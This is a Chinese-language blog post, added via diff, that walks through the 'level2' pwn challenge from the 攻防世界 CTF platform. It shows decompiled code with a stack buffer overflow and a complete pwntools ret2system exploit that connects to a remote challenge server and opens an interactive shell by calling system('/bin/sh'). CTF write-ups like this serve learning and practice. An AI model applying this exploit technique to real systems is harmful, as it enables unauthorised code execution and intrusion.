@@ -1,0 +1,53 @@
+---
+layout: post
+title:  level2
+date:   2020-08-19 00:01:01 +0300
+image:  2020-08-19-woman.jpg
+tags:   [ctf,pwn,攻防世界]
+---
+
+先运行一波
+
+![]({{site.baseurl}}/img/2020-08-19-run.jpg)
+
+ida打开文件，进入主函数，查看代码
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  system("echo 'Hello World!'");
+  return 0;
+}
+```
+
+要求我们输入的函数应该是vulnerable_function(),进入函数查看代码
+
+```assembly
+ssize_t vulnerable_function()
+{
+  char buf; // [esp+0h] [ebp-88h]
+
+  system("echo Input:");
+  return read(0, &buf, 0x100u);
+}
+```
+
+查找字符串发现没有system("/bin/sh")函数，只有"/bin/sh"字符串
+
+所以可以进入到system函数之后，构造system函数的栈帧，system里面的参数的地址写"/bin/sh"的地址
+
+exp
+
+```assembly
+from pwn import *
+
+io = remote("220.249.52.133",37826)
+payload = "A"*(0x88 + 4) + p32(0x08048320) + p32(0xdeadbeef) + p32(0x0804A024)
+#io.sendlineafter("Input:\n", payload)
+io.sendline(payload)
+io.interactive()
+
+```
+
+![]({{site.baseurl}}/img/2020-08-19-result.jpg)
